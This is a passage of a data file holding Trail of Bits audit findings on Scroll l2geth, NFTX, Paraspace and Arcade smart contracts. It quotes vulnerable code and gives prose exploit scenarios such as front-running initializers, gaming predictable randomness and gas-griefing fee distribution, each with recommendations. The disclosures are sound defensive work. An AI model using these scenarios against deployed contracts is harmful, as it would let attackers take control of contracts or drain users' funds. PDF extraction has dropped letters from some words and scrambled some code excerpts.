types.Sender(). (go-ethereum/rollup/fees/rollup_fee.go#198202) Exploit Scenario An attacker generates a denial-of-service attack against the sequencer by submitting extraordinarily large transactions. Because ECDSA recovery is a CPU-intensive operation and is executed before the transaction size is checked, the attacker is able to exhaust the memory resources of the sequencer. Recommendations Short term, modify the code to check for L1 fees in the TxPool.validateTx() function immediately after that function calls types.Sender(). This will ensure that other, less expensive-to-check validations are performed before the ECDSA signature is recovered. Long term, exercise caution when making changes to code paths that validate information received from public sources or gossip. For changes to the transaction pool, a good general rule of thumb is to validate transaction criteria in the following order:", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "7. Syncing nodes fail to check consensus rule for L1 message count ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-scrollL2geth-initial-securityreview.pdf", "body": "l2geth adds a consensus rule requiring that there be no more than L1Config.NumL1MessagesPerBlock number of L1 messages per L2 block. This rule is checked by the sequencer when building new blocks but is not checked by syncing nodes through the ValidateL1Messages function, as shown in gure 7.1. // TODO: consider adding a rule to enforce L1Config.NumL1MessagesPerBlock. // If there are L1 messages available, sequencer nodes should include them. // However, this is hard to enforce as different nodes might have different views of L1. Figure 7.1: The ValidateL1Messages function does not check the NumL1MessagesPerBlock restriction. (go-ethereum/core/block_validator.go#145147) The TODO comment shown in the gure expresses a concern that syncing nodes cannot enforce NumL1MessagesPerBlock due to the dierent view of L1 that the nodes may have; however, this issue does not prevent syncing nodes from simply checking the number of L1 messages included in the block. Exploit Scenario A malicious sequencer ignores the NumL1MessagesPerBlock restriction while constructing a block, thus bypassing the consensus rules. Follower nodes consider the block to be valid even though the consensus rule is violated. Recommendations Short term, add a check to ValidateL1Messages to check the maximum number of L1 messages per block restriction. Long term, document and check all changes to the systems consensus rules to ensure that both nodes that construct blocks and nodes that sync blocks check the consensus rules. This includes having syncing nodes check whether an L1 transaction actually exists on the L1, a concern expressed in comments further up in the ValidateL1Messages function. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "1. Reliance on third-party library for deployment ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/NFTX.pdf", "body": "Due to the use of the delegatecall proxy pattern, some NFTX contracts cannot be initialized with their own constructors; instead, they have initializer functions. These functions can be front-run, allowing an attacker to initialize contracts incorrectly. function __NFTXInventoryStaking_init(address _nftxVaultFactory) external virtual override initializer { __Ownable_init(); nftxVaultFactory = INFTXVaultFactory(_nftxVaultFactory); address xTokenImpl = address(new XTokenUpgradeable()); __UpgradeableBeacon__init(xTokenImpl); } Figure 1.1: The initializer function in NFTXInventoryStaking.sol:37-42 The following contracts have initializer functions that can be front-run:  NFTXInventoryStaking  NFTXVaultFactoryUpgradeable  NFTXEligibilityManager  NFTXLPStaking  NFTXSimpleFeeDistributor The NFTX team relies on hardhat-upgrades, a library that oers a series of safety checks for use with certain OpenZeppelin proxy reference implementations to aid in the proxy deployment process. It is important that the NFTX team become familiar with how the hardhat-upgrades library works internally and with the caveats it might have. For example, some proxy patterns like the beacon pattern are not yet supported by the library. Exploit Scenario Bob uses the library incorrectly when deploying a new contract: he calls upgradeTo() and then uses the fallback function to initialize the contract. Eve front-runs the call to the initialization function and initializes the contract with her own address, which results in an incorrect initialization and Eves control over the contract. Recommendations Short term, document the protocols use of the library and the proxy types it supports. Long term, use a factory pattern instead of the initializer functions to prevent front-running of the initializer functions.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "2. Missing validation of proxy admin indices ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/NFTX.pdf", "body": "Multiple functions of the ProxyController contract take an index as an input. The index determines which proxy (managed by the controller) is being targeted. However, the index is never validated, which means that the function will be executed even if the index is out of bounds with respect to the number of proxies managed by the contract (in this case, ve). function changeProxyAdmin(uint256 index, address newAdmin) public onlyOwner { } if (index == 0) { vaultFactoryProxy.changeAdmin(newAdmin); } else if (index == 1) { eligManagerProxy.changeAdmin(newAdmin); } else if (index == 2) { stakingProviderProxy.changeAdmin(newAdmin); } else if (index == 3) { stakingProxy.changeAdmin(newAdmin); } else if (index == 4) { feeDistribProxy.changeAdmin(newAdmin); } emit ProxyAdminChanged(index, newAdmin); Figure 2.1: The changeProxyAdmin function in ProxyController.sol:79-95 In the changeProxyAdmin function, a ProxyAdminChanged event is emitted even if the supplied index is out of bounds (gure 2.1). Other ProxyController functions return the zero address if the index is out of bounds. For example, getAdmin() should return the address of the targeted proxys admin. If getAdmin() returns the zero address, the caller cannot know whether she supplied the wrong index or whether the targeted proxy simply has no admin. function getAdmin(uint256 index) public view returns (address admin) { if (index == 0) { return vaultFactoryProxy.admin(); } else if (index == 1) { return eligManagerProxy.admin(); } else if (index == 2) { return stakingProviderProxy.admin(); } else if (index == 3) { return stakingProxy.admin(); } else if (index == 4) { return feeDistribProxy.admin(); } } Figure 2.2: The getAdmin function in ProxyController.sol:38-50 Exploit Scenario A contract relying on the ProxyController contract calls one of the view functions, like getAdmin(), with the wrong index. The function is executed normally and implicitly returns zero, leading to unexpected behavior. Recommendations Short term, document this behavior so that clients are aware of it and are able to include safeguards to prevent unanticipated behavior. Long term, consider adding an index check to the aected functions so that they revert if they receive an out-of-bounds index.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "3. Random token withdrawals can be gamed ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/NFTX.pdf", "body": "The algorithm used to randomly select a token for withdrawal from a vault is deterministic and predictable. function getRandomTokenIdFromVault() internal virtual returns (uint256) { uint256 randomIndex = uint256( keccak256( abi.encodePacked( blockhash(block.number - 1), randNonce, block.coinbase, block.difficulty, block.timestamp ) ) ) % holdings.length(); ++randNonce; return holdings.at(randomIndex); } Figure 3.1: The getRandomTokenIdFromVault function in NFTXVaultUpgradable.sol:531-545 All the elements used to calculate randomIndex are known to the caller (gure 3.1). Therefore, a contract calling this function can predict the resulting token before choosing to execute the withdrawal. This nding is of high diculty because NFTXs vault economics incentivizes users to deposit tokens of equal value. Moreover, the cost of deploying a custom exploit contract will likely outweigh the fee savings of choosing a token at random for withdrawal. Exploit Scenario Alice wishes to withdraw a specic token from a vault but wants to pay the lower random redemption fee rather than the higher target redemption fee. She deploys a contract that checks whether the randomly chosen token is her target and, if so, automatically executes the random withdrawal. Recommendations Short term, document the risks described in this nding so that clients are aware of them. Long term, consider removing all randomness from NFTX.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "4. Duplicate receivers allowed by addReceiver() ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/NFTX.pdf", "body": "The NFTXSimpleFeeDistributor contract is in charge of protocol fee distribution. To facilitate the fee distribution process, it allows the contract owner (the NFTX DAO) to manage a list of fee receivers. To add a new fee receiver to the contract, the owner calls the addReceiver() function. function addReceiver( uint256 _allocPoint, address _receiver, bool _isContract ) external override virtual onlyOwner { _addReceiver(_allocPoint, _receiver, _isContract); } Figure 4.1: The addReceiver() function in NFTXSimpleFeeDistributor This function in turn executes the internal logic that pushes a new receiver to the receiver list. function _addReceiver( uint256 _allocPoint, address _receiver, bool _isContract ) internal virtual { FeeReceiver memory _feeReceiver = FeeReceiver(_allocPoint, _receiver, _isContract); feeReceivers.push(_feeReceiver); allocTotal += _allocPoint; emit AddFeeReceiver(_receiver, _allocPoint); } Figure 4.2: The _addReceiver() function in NFTXSimpleFeeDistributor However, the function does not check whether the receiver is already in the list. Without this check, receivers can be accidentally added multiple times to the list, which would increase the amount of fees they receive. The issue is of high diculty because the addReceiver() function is owner-protected and, as indicated by the NFTX team, the owner is the NFTX DAO. Because the DAO itself was out of scope for this review, we do not know what the process to become a receiver looks like. We assume that a DAO proposal has to be created and a certain quorum has to be met for it to be executed. Exploit Scenario A proposal is created to add a new receiver to the fee distributor contract. The receiver address was already added, but the DAO members are not aware of this. The proposal passes, and the receiver is added. The receiver gains more fees than he is entitled to. Recommendations Short term, document this behavior so that the NFTX DAO is aware of it and performs the adequate checks before adding a new receiver. Long term, consider adding a duplicate check to the _addReceiver() function.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "5. OpenZeppelin vulnerability can break initialization ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/NFTX.pdf", "body": "NFTX extensively uses OpenZeppelin v3.4.1. A bug was recently discovered in all OpenZeppelin versions prior to v4.4.1 that aects initializer functions invoked separately during contract creation: the bug causes the contract initialization modier to fail to prevent reentrancy to the initializers (see CVE-2021-46320). Currently, no external calls to untrusted code are made during contract initialization. However, if the NFTX team were to add a new feature that requires such calls to be made, it would have to add the necessary safeguards to prevent reentrancy. Exploit Scenario An NFTX contract initialization function makes a call to an external contract that calls back to the initializer with dierent arguments. The faulty OpenZeppelin initializer modier fails to prevent this reentrancy. Recommendations Short term, upgrade OpenZeppelin to v4.4.1 or newer. Long term, integrate a dependency checking tool like Dependabot into the NFTX CI process.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "6. Potentially excessive gas fees imposed on users for protocol fee distribution ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/NFTX.pdf", "body": "Whenever a user executes a minting, redeeming, or swapping operation on a vault, a fee is charged to the user and is sent to the NFXTSimpleFeeDistributor contract for distribution. function _chargeAndDistributeFees(address user, uint256 amount) internal virtual { // Do not charge fees if the zap contract is calling // Added in v1.0.3. Changed to mapping in v1.0.5. INFTXVaultFactory _vaultFactory = vaultFactory; if (_vaultFactory.excludedFromFees(msg.sender)) { return; } // Mint fees directly to the distributor and distribute. if (amount > 0) { address feeDistributor = _vaultFactory.feeDistributor(); // Changed to a _transfer() in v1.0.3. _transfer(user, feeDistributor, amount); INFTXFeeDistributor(feeDistributor).distribute(vaultId); } } Figure 6.1: The _chargeAndDistributeFees() function in NFTXVaultUpgradeable.sol After the fee is sent to the NFXTSimpleFeeDistributor contract, the distribute() function is then called to distribute all accrued fees. function distribute(uint256 vaultId) external override virtual nonReentrant { require(nftxVaultFactory != address(0)); address _vault = INFTXVaultFactory(nftxVaultFactory).vault(vaultId); uint256 tokenBalance = IERC20Upgradeable(_vault).balanceOf(address(this)); if (distributionPaused || allocTotal == 0) { IERC20Upgradeable(_vault).safeTransfer(treasury, tokenBalance); return; } uint256 length = feeReceivers.length; uint256 leftover; for (uint256 i; i < length; ++i) { FeeReceiver memory _feeReceiver = feeReceivers[i]; uint256 amountToSend = leftover + ((tokenBalance * _feeReceiver.allocPoint) / allocTotal); uint256 currentTokenBalance = IERC20Upgradeable(_vault).balanceOf(address(this)); amountToSend = amountToSend > currentTokenBalance ? currentTokenBalance : amountToSend; bool complete = _sendForReceiver(_feeReceiver, vaultId, _vault, amountToSend); if (!complete) { uint256 remaining = IERC20Upgradeable(_vault).allowance(address(this), _feeReceiver.receiver); IERC20Upgradeable(_vault).safeApprove(_feeReceiver.receiver, 0); leftover = remaining; } else { leftover = 0; } } if (leftover != 0) { uint256 currentTokenBalance = IERC20Upgradeable(_vault).balanceOf(address(this)); IERC20Upgradeable(_vault).safeTransfer(treasury, currentTokenBalance); } } Figure 6.2: The distribute() function in NFTXSimpleFeeDistributor.sol If the token balance of the contract is low enough (but not zero), the number of tokens distributed to each receiver (amountToSend) will be close to zero. Ultimately, this can disincentivize the use of the protocol, regardless of the number of tokens distributed. Users have to pay the gas fee for the fee distribution operation, the gas fees for the token operations (e.g., redeeming, minting, or swapping), and the protocol fees themselves. Exploit Scenario Alice redeems a token from a vault, pays the necessary protocol fee, sends it to the NFTXSimpleFeeDistributor contract, and calls the distribute() function. Because the balance of the distributor contract is very low (e.g., $0.50), Alice has to pay a substantial amount in gas to distribute a near-zero amount in fees between all fee receiver addresses. Recommendations Short term, add a requirement for a minimum balance that the NFTXSimpleFeeDistributor contract should have for the distribution operation to execute. Alternatively, implement a periodical distribution of fees (e.g., once a day or once every number of blocks). Long term, consider redesigning the fee distribution mechanism to prevent the distribution of small fees. Also consider whether protocol users should pay for said distribution. See appendix D for guidance on redesigning this mechanism.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "7. Risk of denial of service due to unbounded loop ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/NFTX.pdf", "body": "When protocol fees are distributed, the system loops through the list of beneciaries (known internally as receivers) to send them the protocol fees they are entitled to. function distribute(uint256 vaultId) external override virtual nonReentrant { require(nftxVaultFactory != address(0)); address _vault = INFTXVaultFactory(nftxVaultFactory).vault(vaultId); uint256 tokenBalance = IERC20Upgradeable(_vault).balanceOf(address(this)); if (distributionPaused || allocTotal == 0) { IERC20Upgradeable(_vault).safeTransfer(treasury, tokenBalance); return; } uint256 length = feeReceivers.length; uint256 leftover; for (uint256 i; i < length; ++i) { FeeReceiver memory _feeReceiver = feeReceivers[i]; uint256 amountToSend = leftover + ((tokenBalance * _feeReceiver.allocPoint) / allocTotal); uint256 currentTokenBalance = IERC20Upgradeable(_vault).balanceOf(address(this)); amountToSend = amountToSend > currentTokenBalance ? currentTokenBalance : amountToSend; bool complete = _sendForReceiver(_feeReceiver, vaultId, _vault, amountToSend); if (!complete) { uint256 remaining = IERC20Upgradeable(_vault).allowance(address(this), _feeReceiver.receiver); IERC20Upgradeable(_vault).safeApprove(_feeReceiver.receiver, 0); leftover = remaining; } else { leftover = 0; } } if (leftover != 0) { uint256 currentTokenBalance = IERC20Upgradeable(_vault).balanceOf(address(this)); IERC20Upgradeable(_vault).safeTransfer(treasury, currentTokenBalance); } } Figure 7.1: The distribute() function in NFTXSimpleFeeDistributor.sol Because this loop is unbounded and the number of receivers can grow, the amount of gas consumed is also unbounded. function _sendForReceiver(FeeReceiver memory _receiver, uint256 _vaultId, address _vault, uint256 amountToSend) internal virtual returns (bool) { if (_receiver.isContract) { IERC20Upgradeable(_vault).safeIncreaseAllowance(_receiver.receiver, amountToSend); bytes memory payload = abi.encodeWithSelector(INFTXLPStaking.receiveRewards.selector, _vaultId, amountToSend); (bool success, ) = address(_receiver.receiver).call(payload); // If the allowance has not been spent, it means we can pass it forward to next. return success && IERC20Upgradeable(_vault).allowance(address(this), _receiver.receiver) == 0; } else { IERC20Upgradeable(_vault).safeTransfer(_receiver.receiver, amountToSend); return true; } } Figure 7.2: The _sendForReceiver() function in NFTXSimpleFeeDistributor.sol Additionally, if one of the receivers is a contract, code that signicantly increases the gas cost of the fee distribution will execute (gure 7.2). It is important to note that fees are usually distributed within the context of user transactions (redeeming, minting, etc.), so the total cost of the distribution operation depends on the logic outside of the distribute() function. Exploit Scenario The NFTX team adds a new feature that allows NFTX token holders who stake their tokens to register as receivers and gain a portion of protocol fees; because of that, the number of receivers grows dramatically. Due to the large number of receivers, the distribute() function cannot execute because the cost of executing it has reached the block gas limit. As a result, users are unable to mint, redeem, or swap tokens. Recommendations Short term, examine the execution cost of the function to determine the safe bounds of the loop and, if possible, consider splitting the distribution operation into multiple calls. Long term, consider redesigning the fee distribution mechanism to avoid unbounded loops and prevent denials of service. See appendix D for guidance on redesigning this mechanism.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "8. A malicious fee receiver can cause a denial of service ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/NFTX.pdf", "body": "Whenever a user executes a minting, redeeming, or swapping operation on a vault, a fee is charged to the user and is sent to the NFXTSimpleFeeDistributor contract for distribution. The distribution function loops through all fee receivers and sends them the number of tokens they are entitled to (see gure 7.1). If the fee receiver is a contract, a special logic is executed; instead of receiving the corresponding number of tokens, the receiver pulls all the tokens from the NFXTSimpleFeeDistributor contract. function _sendForReceiver(FeeReceiver memory _receiver, uint256 _vaultId, address _vault, uint256 amountToSend) internal virtual returns (bool) { if (_receiver.isContract) { IERC20Upgradeable(_vault).safeIncreaseAllowance(_receiver.receiver, amountToSend); bytes memory payload = abi.encodeWithSelector(INFTXLPStaking.receiveRewards.selector, _vaultId, amountToSend); (bool success, ) = address(_receiver.receiver).call(payload); // If the allowance has not been spent, it means we can pass it forward to next. return success && IERC20Upgradeable(_vault).allowance(address(this), _receiver.receiver) == 0; } else { IERC20Upgradeable(_vault).safeTransfer(_receiver.receiver, amountToSend); return true; } } Figure 8.1: The _sendForReceiver() function in NFTXSimpleFeeDistributor.sol In this case, because the receiver contract executes arbitrary logic and receives all of the gas, the receiver contract can spend all of it; as a result, only 1/64 of the original gas forwarded to the receiver contract would remain to continue executing the distribute() function (see EIP-150), which may not be enough to complete the execution, leading to a denial of service. The issue is of high diculty because the addReceiver() function is owner-protected and, as indicated by the NFTX team, the owner is the NFTX DAO. Because the DAO itself was out of scope for this review, we do not know what the process to become a receiver looks like. We assume that a proposal is created and a certain quorum has to be met for it to be executed. Exploit Scenario Eve, a malicious receiver, sets up a smart contract that consumes all the gas forwarded to it when receiveRewards is called. As a result, the distribute() function runs out of gas, causing a denial of service on the vaults calling the function. Recommendations Short term, change the fee distribution mechanism so that only a token transfer is executed even if the receiver is a contract. Long term, consider redesigning the fee distribution mechanism to prevent malicious fee receivers from causing a denial of service on the protocol. See appendix D for guidance on redesigning this mechanism.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "9. Vault managers can grief users ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/NFTX.pdf", "body": "The process of creating vaults in the NFTX protocol is trustless. This means that anyone can create a new vault and use any asset as the underlying vault NFT. The user calls the NFTXVaultFactoryUpgradeable contract to create a new vault. After deploying the new vault, the contract sets the user as the vault manager. Vault managers can disable certain vault features (gure 9.1) and change vault fees (gure 9.2). function setVaultFeatures( bool _enableMint, bool _enableRandomRedeem, bool _enableTargetRedeem, bool _enableRandomSwap, bool _enableTargetSwap ) public override virtual { onlyPrivileged(); enableMint = _enableMint; enableRandomRedeem = _enableRandomRedeem; enableTargetRedeem = _enableTargetRedeem; enableRandomSwap = _enableRandomSwap; enableTargetSwap = _enableTargetSwap; emit EnableMintUpdated(_enableMint); emit EnableRandomRedeemUpdated(_enableRandomRedeem); emit EnableTargetRedeemUpdated(_enableTargetRedeem); emit EnableRandomSwapUpdated(_enableRandomSwap); emit EnableTargetSwapUpdated(_enableTargetSwap); } Figure 9.1: The setVaultFeatures() function in NFTXVaultUpgradeable.sol function setFees( uint256 _mintFee, uint256 _randomRedeemFee, uint256 _targetRedeemFee, uint256 _randomSwapFee, uint256 _targetSwapFee ) public override virtual { onlyPrivileged(); vaultFactory.setVaultFees( vaultId, _mintFee, _randomRedeemFee, _targetRedeemFee, _randomSwapFee, _targetSwapFee ); } Figure 9.2: The setFees() function in NFTXVaultUpgradeable.sol The eects of these functions are instantaneous, which means users may not be able to react in time to these changes and exit the vaults. Additionally, disabling vault features with the setVaultFeatures() function can trap tokens in the contract. Ultimately, this risk is related to the trustless nature of vault creation, but the NFTX team can take certain measures to minimize the eects. One such measure, which is already in place, is vault verication, in which the vault manager calls the finalizeVault() function to pass her management rights to the zero address. This function then gives the veried status to the vault in the NFTX web application. Exploit Scenario Eve, a malicious manager, creates a new vault for a popular NFT collection. After it gains some user traction, she unilaterally changes the vault fees to the maximum (0.5 ether), which forces users to either pay the high fee or relinquish their tokens. Recommendations Short term, document the risks of interacting with vaults that have not been nalized (i.e., vaults that have managers). Long term, consider adding delays to manager-only functionality (e.g., a certain number of blocks) so that users have time to react and exit the vault.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "10. Lack of zero address check in functions ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/NFTX.pdf", "body": "Certain setter functions fail to validate incoming arguments, so callers can accidentally set important state variables to the zero address. This issue aects the following contracts and functions:  NFTXInventoryStaking.sol  __NFTXInventoryStaking_init()  NFTXSimpleFeeDistributor.sol  setInventoryStakingAddress()  addReceiver()  changeReceiverAddress()  RewardDistributionToken  __RewardDistributionToken_init() Exploit Scenario Alice deploys a new version of the NFTXInventoryStaking contract. When she initializes the proxy contract, she inputs the zero address as the address of the _nftxVaultFactory state variable, leading to an incorrect initialization. Recommendations Short term, add zero-value checks on all function arguments to ensure that users cannot accidentally set incorrect values, misconguring the system. Long term, use Slither, which will catch functions that do not have zero checks. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "1. Missing negative tests for several assertions ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance3.pdf", "body": "The Paraspace protocol consists of numerous interacting components, and each operation is validated by checks that are widely dispersed throughout the codebase. Therefore, a robust suite of negative test cases is necessary to prevent vulnerabilities from being introduced if developers unwittingly remove or alter checks during development. However, a number of checks are present in the codebase without corresponding test cases. For example, the health factor check in the FlashClaimLogic contract is required in order to prevent users from extracting collateralized value from NFTs during ash claims, but there is no unit test to ensure this behavior. Commenting out the lines in gure 1.1 does not cause any test to fail. require( 86 87 88 89 ); healthFactor > DataTypes.HEALTH_FACTOR_LIQUIDATION_THRESHOLD, Errors.HEALTH_FACTOR_LOWER_THAN_LIQUIDATION_THRESHOLD Figure 1.1: FlashClaimLogic.sol#8689 A test that captures the desired behavior could, for example, initiate a ash claim of a BAYC NFT that is tied to collateralized staked APE (sAPE) and then withdraw the APE directly from the ApeCoinStaking contract, causing the accounts health factor to fall below 1. As another example, removing the following lines from the withdrawApeCoin function in the PoolApeStaking contract demonstrates that no negative test validates this functions logic. require( 73 74 75 76 ); nToken.ownerOf(_nfts[index].tokenId) == msg.sender, Errors.NOT_THE_OWNER Figure 1.2: PoolApeStaking.sol#73 Exploit Scenario Alice, a Paraspace developer, refactors the FlashClaimLogic contract and mistakenly omits the health factor check. Expecting the test suite to catch such errors, she commits the code, and the new version of the Paraspace contracts becomes vulnerable to undercollateralization attacks. Recommendations Short term, for each require statement in the codebase, ensure that at least one unit test fails when the assertion is removed. Long term, consider requiring that Paraspace developers ensure a minimum amount of unit test code coverage when they submit new pull requests to the Paraspace contracts, and that they provide justication for uncovered conditions. 2. Use of a magic constant with unclear meaning for the sAPE unstaking incentive Severity: Informational Diculty: High Type: Conguration Finding ID: TOB-PARASPACE-2 Target: contracts/protocol/tokenization/NTokenApeStaking.sol", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "2. Solidity compiler optimizations can be problematic ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-arcade-securityreview.pdf", "body": "Arcade has enabled optional compiler optimizations in Solidity. According to a November 2018 audit of the Solidity compiler, the optional optimizations may not be safe. 147 148 149 150 optimizer: { enabled: optimizerEnabled, runs: 200, }, Figure 2.1: The solc optimizer settings in arcade-protocol/hardhat.config.ts High-severity security issues due to optimization bugs have occurred in the past. A high-severity bug in the emscripten-generated solc-js compiler used by True and Remix persisted until late 2018; the x for this bug was not reported in the Solidity changelog. Another high-severity optimization bug resulting in incorrect bit shift results was patched in Solidity 0.5.6. Another bug due to the incorrect caching of Keccak-256 was reported. It is likely that there are latent bugs related to optimization and that future optimizations will introduce new bugs. Exploit Scenario A latent or future bug in Solidity compiler optimizationsor in the Emscripten transpilation to solc-jscauses a security vulnerability in the Arcade contracts. Recommendations Short term, measure the gas savings from optimizations and carefully weigh them against the possibility of an optimization-related bug. Long term, monitor the development and adoption of Solidity compiler optimizations to assess their maturity. 25 Arcade.xyz V3 Security Assessment", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: High"]}, {"title": "3. callApprove does not follow approval best practices ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-arcade-securityreview.pdf", "body": "The AssetVault.callApprove function has undocumented behaviors and lacks the increase/decrease approval functions, which might impede third-party integrations. A well-known race condition exists in the ERC-20 approval mechanism. The race condition is enabled if a user or smart contract calls approve a second time on a spender that has already been allowed. If the spender sees the transaction containing the call before it has been mined, they can call transferFrom to transfer the previous value and then still receive authorization to transfer the new value. To mitigate this, AssetVault uses the SafeERC20.safeApprove function, which will revert if the allowance is updated from nonzero to nonzero. However, this behavior is not documented, and it might break the protocols integration with third-party contracts or o-chain components. 282 283 284 285 286 287 288 289 290 291 292 293 294 295 37 38 39 40 41 42 function callApprove( address token, address spender, uint256 amount ) external override onlyAllowedCallers onlyWithdrawDisabled nonReentrant { if (!CallWhitelistApprovals(whitelist).isApproved(token, spender)) { revert AV_NonWhitelistedApproval(token, spender); } // Do approval IERC20(token).safeApprove(spender, amount); emit Approve(msg.sender, token, spender, amount); } Figure 3.1: The callApprove function in arcade-protocol/contracts/vault/AssetVault.sol /** * @dev Deprecated. This function has issues similar to the ones found in * {IERC20-approve}, and its usage is discouraged. * * Whenever possible, use {safeIncreaseAllowance} and * {safeDecreaseAllowance} instead. 26 Arcade.xyz V3 Security Assessment */ function safeApprove( IERC20 token, address spender, uint256 value ) internal { 43 44 45 46 47 48 49 50 51 52 53 54 55 56 spender, value)); 57 } // safeApprove should only be called when setting an initial allowance, // or when resetting it to zero. To increase and decrease it, use // 'safeIncreaseAllowance' and 'safeDecreaseAllowance' require( (value == 0) || (token.allowance(address(this), spender) == 0), \"SafeERC20: approve from non-zero to non-zero allowance\" ); _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, Figure 3.2: The safeApprove function in openzeppelin-contracts/contracts/token/ERC20/utils/SafeERC20.sol An alternative way to mitigate the ERC-20 race condition is to use the increaseAllowance and decreaseAllowance functions to safely update allowances. These functions are widely used by the ecosystem and allow users to update approvals with less ambiguity. uint256 newAllowance = token.allowance(address(this), spender) + value; _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, } ) internal { function safeIncreaseAllowance( function safeDecreaseAllowance( IERC20 token, address spender, uint256 value 59 60 61 62 63 64 65 spender, newAllowance)); 66 67 68 69 70 71 72 73 74 75 zero\"); 76 77 abi.encodeWithSelector(token.approve.selector, spender, newAllowance)); 78 79 uint256 newAllowance = oldAllowance - value; _callOptionalReturn(token, IERC20 token, address spender, uint256 value ) internal { unchecked { } } uint256 oldAllowance = token.allowance(address(this), spender); require(oldAllowance >= value, \"SafeERC20: decreased allowance below Figure 3.3: The safeIncreaseAllowance and safeDecreaseAllowance functions in openzeppelin-contracts/contracts/token/ERC20/utils/SafeERC20.sol 27 Arcade.xyz V3 Security Assessment Exploit Scenario Alice, the owner of an asset vault, sets up an approval of 1,000 for her external contract by calling callApprove. She later decides to update the approval amount to 1,500 and again calls callApprove. This second call reverts, which she did not expect. Recommendations Short term, take one of the following actions:  Update the documentation to make it clear to users and other integrating smart contract developers that two transactions are needed to update allowances.  Add two new functions in the AssetVault contract: callIncreaseAllowance and callDecreaseAllowance, which internally call SafeERC20.safeIncreaseAllowance and SafeERC20.safeDecreaseAllowance, respectively. Long term, when using external libraries/contracts, always ensure that they are being used correctly and that edge cases are explained in the documentation. 28 Arcade.xyz V3 Security Assessment", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Medium"]}, {"title": "4. Risk of confusing events due to missing checks in whitelist contracts ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-arcade-securityreview.pdf", "body": "The CallWhitelist contracts add and remove functions do not check whether the given call has been registered in the whitelist. As a result, add could be used to register calls that have already been registered, and remove could be used to remove calls that have never been registered; these types of calls would still emit events. For example, invoking remove with a call that is not in the whitelist would emit a CallRemoved event even though no call was removed. Such an event could confuse o-chain monitoring systems, or at least make it more dicult to retrace what happened by looking at the emitted event. 64 65 66 67 function add(address callee, bytes4 selector) external override onlyOwner { whitelist[callee][selector] = true; emit CallAdded(msg.sender, callee, selector); } Figure 4.1: The add function in arcade-protocol/contracts/vault/CallWhitelist.sol 75 76 77 78 function remove(address callee, bytes4 selector) external override onlyOwner { whitelist[callee][selector] = false; emit CallRemoved(msg.sender, callee, selector); } Figure 4.2: The remove function in arcade-protocol/contracts/vault/CallWhitelist.sol A similar problem exists in the CallWhitelistDelegation.setRegistry function. This function can be called to set the registry address to the current registry address. In that case, the emitted RegistryChanged event would be confusing because nothing would have actually changed. 85 86 87 88 89 function setRegistry(address _registry) external onlyOwner { registry = IDelegationRegistry(_registry); emit RegistryChanged(msg.sender, _registry); } 29 Arcade.xyz V3 Security Assessment Figure 4.3: The setRegistry function in arcade-protocol/contracts/vault/CallWhitelistDelegation.sol Arcade has explained that the owner of the whitelist contracts in Arcade V3 will be a (set of) governance contract(s), so it is unlikely that this issue will happen. However, it is possible, and it could be prevented by more validation. Exploit Scenario No calls have yet been added to the whitelist in CallWhitelist. Through the governance system, a proposal to remove a call with the address 0x1 and the selector 0x12345678 is approved. The proposal is executed, and CallWhitelist.remove is called. The transaction succeeds, and a CallRemoved event is emitted, even though the removed call was never in the whitelist in the rst place. Recommendations Short term, add validation to the add, remove, and setRegistry functions. For the add function, it should ensure that the given call is not already in the whitelist. For the remove function, it should ensure that the call is currently in the whitelist. For the setRegistry function, it should ensure that the new registry address is not the current registry address. Adding this validation will prevent confusing events from being emitted and ease the tracing of events in the whitelist over time. Long term, when dealing with function arguments, always ensure that all inputs are validated as tightly as possible and that the subsequent emitted events are meaningful. Additionally, consider setting up an o-chain monitoring system that will track important system events. Such a system will provide an overview of the events that occur in the contracts and will be useful when incidents occur. 30 Arcade.xyz V3 Security Assessment", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "5. Missing checks of _exists() return value ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-arcade-securityreview.pdf", "body": "The ERC-721 _exists() function returns a Boolean value that indicates whether a token with the specied tokenId exists. In two instances in Arcades codebase, the function is called but its return value is not checked, bypassing the intended result of the existence check. In particular, in the PromissoryNote.tokenURI() and VaultFactory.tokenURI() functions, _exists() is called before the URI for the tokenId is returned, but its return value is not checked. If the given NFT does not exist, the 